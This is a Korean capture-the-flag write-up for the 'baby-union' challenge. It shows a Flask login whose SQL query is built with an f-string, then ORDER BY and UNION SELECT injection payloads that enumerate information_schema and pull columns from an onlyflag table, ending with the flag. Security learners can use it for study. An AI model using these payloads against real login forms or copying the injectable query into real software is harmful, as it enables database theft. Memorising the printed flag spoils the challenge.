# S4 · baby-union

### 1. VM에 접속한다

문제 페이지에는 `uid`, `upw` 입력창이 있고, 입력값으로 실행되는 SQL 쿼리를 확인할 수 있다.

<p align="center"><img src="https://github.com/user-attachments/assets/9fed5037-ddba-414c-a645-314fa4c3d0ce" width="950" alt="baby-union 문제 초기 화면" /></p>

### 2. 코드 분석 — SQL Injection 원인

제공된 Flask 코드에서는 두 입력값을 SQL 문자열에 그대로 삽입한다.

```python
uid = request.form.get('uid', '')
upw = request.form.get('upw', '')
if uid and upw:
    cur = mysql.connection.cursor()
    cur.execute(f"SELECT * FROM users WHERE uid='{uid}' and upw='{upw}';")
    data = cur.fetchall()
    if data:
        return render_template("user.html", data=data)
```

- **SQL Injection 원인:** `uid`, `upw`를 별도 처리 없이 f-string으로 쿼리에 넣는다.
- **입력 조건:** `if uid and upw` 때문에 두 칸 모두 채워야 한다. 아래 실습에서는 `upw`에 임의 값 `1234`를 사용한다.
- **출력:** `fetchall()`로 조회된 행을 가져와 `user.html`에 전달한다.

### 3. ORDER BY로 컬럼 개수 확인

`UNION SELECT`는 앞뒤의 컬럼 개수가 같아야 한다. 먼저 `uid`에 다음 구문을 차례대로 넣어 확인한다.

```sql
' ORDER BY 1 #
' ORDER BY 2 #
' ORDER BY 3 #
' ORDER BY 4 #
' ORDER BY 5 #
```

`ORDER BY n`은 **n개 행을 조회**하는 게 아니라 **n번째 컬럼으로 정렬**하는 구문이다. 확인 결과 기존 `SELECT * FROM users`는 **4개 컬럼**을 반환하므로, UNION에도 4개를 맞춘다.

**ORDER BY 테스트 화면**

<p align="center"><img src="https://github.com/user-attachments/assets/f4b12a9b-ba32-4351-8d79-3a7d0981783b" width="580" alt="ORDER BY 컬럼 개수 확인 첫 번째 화면" /></p>

<p align="center"><img src="https://github.com/user-attachments/assets/1e425526-8fad-4ea9-964e-f354010900b7" width="800" alt="ORDER BY 컬럼 개수 확인 두 번째 화면" /></p>

### 4. UNION으로 테이블 목록 조회

**uid 입력값**

```sql
' UNION SELECT table_name,NULL,NULL,NULL
FROM information_schema.tables
WHERE table_schema=DATABASE() #
```

- `information_schema.tables`는 MySQL의 테이블 정보를 담고 있다.
- `table_name`으로 테이블 이름을 가져오며, `table_schema=DATABASE()`는 **현재 DB에 속한 테이블만** 선택한다.
- `NULL` 3개는 컬럼을 총 4개로 맞추기 위한 자리표시자이고, `#`는 뒤의 비밀번호 조건을 주석 처리한다.

**조회 결과:** `users`, `onlyflag`

<p align="center"><img src="https://github.com/user-attachments/assets/1a6758eb-ab0d-4832-9d57-4ed0bdb87d57" width="740" alt="UNION으로 조회한 users 및 onlyflag 테이블 목록" /></p>

### 5. onlyflag 테이블의 컬럼 확인

`onlyflag` 테이블이 확인됐으므로 `information_schema.columns`를 조회한다.

```sql
' UNION SELECT column_name,NULL,NULL,NULL
FROM information_schema.columns
WHERE table_schema=DATABASE() AND table_name='onlyflag' #
```

**조회 결과:** `idx`, `sname`, `svalue`, `sflag`, `sclose`

<p align="center"><img src="https://github.com/user-attachments/assets/5515cc81-3c0d-48f5-a04b-12b07fb0a0f8" width="700" alt="onlyflag 테이블의 컬럼 이름 조회 결과" /></p>

### 6. 각 컬럼 조회 및 FLAG 확인

`onlyflag`에 있는 컬럼을 하나씩 조회해 내용을 확인한다. 아래 쿼리도 모두 **`uid`에 입력**하고, `upw`에는 임의의 값을 넣는다.

**① `sflag` 조회**

```sql
' UNION SELECT sflag,NULL,NULL,NULL FROM onlyflag #
```

<p align="center"><img src="https://github.com/user-attachments/assets/fab9cc1c-0d05-4e96-817a-d9fd946e8fc6" width="850" alt="onlyflag sflag 컬럼 조회 화면" /></p>

**② `svalue` 조회**

```sql
' UNION SELECT svalue,NULL,NULL,NULL FROM onlyflag #
```

<p align="center"><img src="https://github.com/user-attachments/assets/08d9d9fe-0a93-481b-a165-ed58bec80fce" width="850" alt="onlyflag svalue 컬럼 조회 화면" /></p>

**③ `sclose` 조회**

```sql
' UNION SELECT sclose,NULL,NULL,NULL FROM onlyflag #
```

<p align="center"><img src="https://github.com/user-attachments/assets/3d1b5e42-a0e7-477e-bc12-40fe731a9afd" width="850" alt="onlyflag sclose 컬럼 조회 화면" /></p>

**확인한 FLAG**

```text
DH{57033624d7f142f57f139b4c9e84bd78da77b4406896c386672f0cbb016f5873}
```

**취약점 원인:** 사용자 입력을 SQL에 직접 결합해 UNION SQL Injection이 발생했으며, 이를 통해 데이터베이스의 테이블·컬럼 구조와 저장된 값을 조회할 수 있었다.
